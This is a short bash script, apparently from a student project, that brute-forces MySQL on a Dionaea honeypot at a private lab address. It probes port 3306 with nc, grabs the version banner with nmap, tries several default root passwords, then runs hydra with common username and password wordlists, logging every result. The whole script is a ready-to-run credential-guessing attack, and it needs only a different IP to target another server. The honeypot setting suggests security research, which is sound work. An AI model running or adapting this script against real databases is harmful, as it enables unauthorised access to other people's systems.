#!/bin/bash
# MySQL brute force - targets Dionaea

DIONAEA="172.16.0.30"
LOGDIR="/home/kali/Desktop/fyp/attack_scripts/logs/brute_force"
USERS="/usr/share/seclists/Usernames/top-usernames-shortlist.txt"
PASS="/usr/share/seclists/Passwords/Common-Credentials/xato-net-10-million-passwords-1000.txt"

mkdir -p "$LOGDIR"

echo "MySQL brute force on $DIONAEA"

if nc -zw2 "$DIONAEA" 3306 2>/dev/null; then
    nmap -sV -p 3306 --script mysql-info "$DIONAEA" -oN "$LOGDIR/mysql_banner_${DIONAEA}.txt" 2>/dev/null
    
    for pass in "" "root" "mysql" "password" "admin" "123456"; do
        timeout 10 mysql -h "$DIONAEA" -u root -p"$pass" -e "SELECT VERSION();" 2>&1 | tee -a "$LOGDIR/mysql_root_${DIONAEA}.txt"
    done
    
    timeout 600 hydra -L "$USERS" -P "$PASS" -t 4 -o "$LOGDIR/mysql_${DIONAEA}.txt" mysql://$DIONAEA 2>/dev/null
else
    echo "MySQL not open"
fi

echo "Done"
